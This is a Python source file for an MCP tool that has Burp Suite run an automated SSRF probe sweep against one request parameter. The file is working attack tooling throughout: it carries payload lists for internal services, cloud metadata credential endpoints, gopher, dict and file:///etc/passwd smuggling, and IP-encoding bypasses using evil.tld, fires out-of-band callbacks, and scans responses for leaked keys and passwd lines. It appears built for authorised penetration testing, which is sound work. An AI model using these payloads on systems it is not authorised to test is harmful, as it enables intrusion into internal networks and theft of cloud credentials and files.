"""test_ssrf — full SSRF surface orchestrator.

Five axes per call:
  §1 Internal IPs (127.0.0.1 / 0.0.0.0 / localhost / 10.x / 172.16.x / 192.168.x)
  §2 Cloud metadata (AWS / GCP / Azure / DO / Alibaba / Oracle)
  §3 Protocol smuggling (gopher / dict / ftp / file / jar / phar / netdoc)
  §4 Header injection (X-Forwarded-For / Host / Referer-based SSRF)
  §5 DNS-rebind + decimal/octal/hex IP encoding bypasses

Collaborator integration: if a Collaborator domain is supplied, all probes
also fire a copy with a Collaborator URL so blind SSRF surfaces via OOB.

No good third-party for the full matrix — nuclei has ~20 templates,
manual is the norm. This orchestrator covers the textbook + WSTG WSTG-INPV-19.
"""

from __future__ import annotations

import asyncio

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client

from ._send import send_probe


_INTERNAL_IPS = (
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://localhost/",
    "http://127.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",     # redis
    "http://127.0.0.1:9200/",     # elasticsearch
    "http://127.0.0.1:5432/",     # postgres
    "http://127.0.0.1:11211/",    # memcached
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://192.168.0.1/",
    "http://169.254.169.254/",    # link-local (cloud metadata)
)

_CLOUD_METADATA = (
    "http://169.254.169.254/latest/meta-data/",                # AWS IMDSv1
    "http://169.254.169.254/computeMetadata/v1/",              # GCP (needs Metadata-Flavor header)
    "http://metadata.google.internal/computeMetadata/v1/",     # GCP DNS variant
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://169.254.169.254/metadata/v1/",                     # DO
    "http://100.100.100.200/latest/meta-data/",                # Alibaba
    "http://192.0.0.192/latest/",                              # Oracle Cloud
)

_PROTOCOL_PAYLOADS = (
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stats",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "ftp://127.0.0.1/",
    "jar:http://127.0.0.1!/",
    "phar://test.phar",
    "netdoc:///etc/passwd",
)

_BYPASS_ENCODINGS = (
    "http://2130706433/",         # decimal 127.0.0.1
    "http://017700000001/",       # octal 127.0.0.1
    "http://0x7f000001/",         # hex 127.0.0.1
    "http://127.000.000.001/",    # zero-padded
    "http://127.0.0.1.nip.io/",   # DNS rebind candidate
    "http://[::1]/",              # IPv6 localhost
    "http://[::ffff:127.0.0.1]/", # IPv4-mapped IPv6
    "http://127.0.0.1#@evil.tld/",  # fragment trick
    "http://evil.tld@127.0.0.1/",   # at-sign URL parse confusion
)

_SSRF_INDICATORS = (
    # AWS
    "ami-id", "instance-id", "iam/security-credentials", "instance-identity",
    "x-amz-", "AccessKeyId", "SecretAccessKey",
    # GCP
    "computeMetadata", "project-id", "service-account",
    # Azure
    "compute", "subscriptionId", "azEnvironment",
    # Redis
    "redis_version:", "uptime_in_seconds:",
    # Memcached
    "STAT pid", "STAT version",
    # SSH banner
    "SSH-2.0-", "SSH-1.99-",
    # Postgres
    "FATAL:", "no pg_hba.conf",
    # File reads
    "root:x:0:0:", "[fonts]", "[boot loader]",
    # Generic
    "Connection refused", "connect ECONNREFUSED",
)


async def _maybe_collab() -> str:
    """Try to get a Collaborator subdomain for OOB. Returns '' on Community."""
    try:
        r = await client.post("/api/collaborator/payload")
        if "error" not in r:
            return r.get("payload", "")
    except Exception:
        pass
    return ""


def register(mcp: FastMCP):

    @mcp.tool()
    async def test_ssrf(  # cost: medium (~50 requests)
        url: str,
        parameter: str,
        method: str = "GET",
        cookies: dict | None = None,
        bearer_token: str = "",
        body_template: str = "",
        body_value_placeholder: str = "VALUE",
        skip_internal: bool = False,
        skip_cloud: bool = False,
        skip_protocols: bool = False,
        skip_bypass: bool = False,
        use_collaborator: bool = True,
    ) -> str:
        """Five-axis SSRF probe sweep across one parameter.

        Args:
            url: Target URL (without the parameter value)
            parameter: Parameter name to inject SSRF payloads into
            method: GET or POST (default GET — query-string injection)
            cookies: Session cookies
            bearer_token: Optional bearer auth
            body_template: For POST/PUT — full body with `body_value_placeholder`
                marking the injection point (e.g. '{"url":"VALUE"}')
            body_value_placeholder: The string in body_template that gets
                replaced with the SSRF payload (default "VALUE")
            skip_internal: Skip §1 (internal IPs)
            skip_cloud: Skip §2 (cloud metadata)
            skip_protocols: Skip §3 (protocol smuggling)
            skip_bypass: Skip §5 (IP encoding bypasses)
            use_collaborator: Fire an additional probe per axis with a
                Collaborator URL to catch blind SSRF
        """
        payloads: list[tuple[str, str]] = []  # (label, value)
        if not skip_internal:
            payloads.extend(("§1 internal", p) for p in _INTERNAL_IPS)
        if not skip_cloud:
            payloads.extend(("§2 cloud", p) for p in _CLOUD_METADATA)
        if not skip_protocols:
            payloads.extend(("§3 protocol", p) for p in _PROTOCOL_PAYLOADS)
        if not skip_bypass:
            payloads.extend(("§5 bypass", p) for p in _BYPASS_ENCODINGS)

        collab_url = ""
        if use_collaborator:
            collab_url = await _maybe_collab()
            if collab_url:
                payloads.append(("§OOB", f"http://{collab_url}/ssrf-probe"))

        async def _fire(label: str, value: str) -> tuple[str, str, dict]:
            if method.upper() == "GET":
                sep = "&" if "?" in url else "?"
                target = f"{url}{sep}{parameter}={value}"
                r = await send_probe("GET", target, {}, cookies=cookies,
                                     bearer=bearer_token)
            else:
                if body_template:
                    b = body_template.replace(body_value_placeholder, value)
                else:
                    b = f"{parameter}={value}"
                r = await send_probe(method, url, {}, body=b, cookies=cookies,
                                     bearer=bearer_token)
            return label, value, r

        results = await asyncio.gather(
            *[_fire(label, val) for label, val in payloads],
            return_exceptions=True,
        )

        # §4 Header injection — done after the main matrix because it doesn't
        # touch the parameter, it injects into headers themselves.
        header_results: list[tuple[str, dict]] = []
        if collab_url:
            for hname in ("Host", "X-Forwarded-Host", "X-Forwarded-For",
                          "Referer", "X-Original-Host"):
                r = await send_probe(method, url,
                                     {hname: collab_url}, cookies=cookies,
                                     bearer=bearer_token,
                                     body=body_template if method != "GET" else "")
                header_results.append((hname, r))

        lines = [f"test_ssrf {method} {url}?{parameter}=<payload>\n"]
        bypasses: list[str] = []

        for r in results:
            if isinstance(r, Exception):
                continue
            label, value, resp = r
            if "error" in resp:
                continue
            s = resp.get("status_code", 0)
            idx = resp.get("history_index", -1)
            body = resp.get("response_body", "") or ""
            ln = resp.get("response_length", 0)

            hit = next((ind for ind in _SSRF_INDICATORS
                        if ind.lower() in body.lower()), None)
            marker = ""
            if hit:
                marker = f"  *** HIT: {hit!r} ***"
                bypasses.append(f"{label} {value} -> {s} (#{idx}) indicator={hit!r}")
            # Long-body deviation when value pointed at TCP:port can also
            # signal connection success (e.g. Redis INFO).
            if "127.0.0.1:" in value and ln > 200 and s in (200, 500):
                if not hit:
                    marker = f"  [?] non-empty body, possible TCP connect"
            lines.append(f"  {label:<14} {value[:50]:<50} -> {s} ({ln}b, #{idx}){marker}")

        if header_results:
            lines.append("")
            lines.append("§4 Header injection (OOB-only, requires Collaborator hit):")
            for hname, resp in header_results:
                if "error" in resp:
                    continue
                idx = resp.get("history_index", -1)
                s = resp.get("status_code", 0)
                lines.append(f"  {hname:<22}-> {s} (#{idx})  "
                             f"(check Collaborator for DNS/HTTP hit)")

        if collab_url:
            lines.append("")
            lines.append(f"OOB callback used: {collab_url}")
            lines.append("Run get_collaborator_interactions after 10-30s to "
                         "confirm blind SSRF hits.")

        lines.append("")
        if bypasses:
            lines.append(f"INLINE HITS ({len(bypasses)}):")
            for b in bypasses:
                lines.append(f"  - {b}")
            lines.append("")
            lines.append("Verify each hit (verify-finding.md). "
                         "vuln_type='ssrf' severity='critical' for cloud-metadata "
                         "or internal-service reach; 'high' for protocol-smuggling.")
        else:
            lines.append("No inline SSRF indicators surfaced. "
                         "If Collaborator was used, poll interactions for blind.")

        return "\n".join(lines)
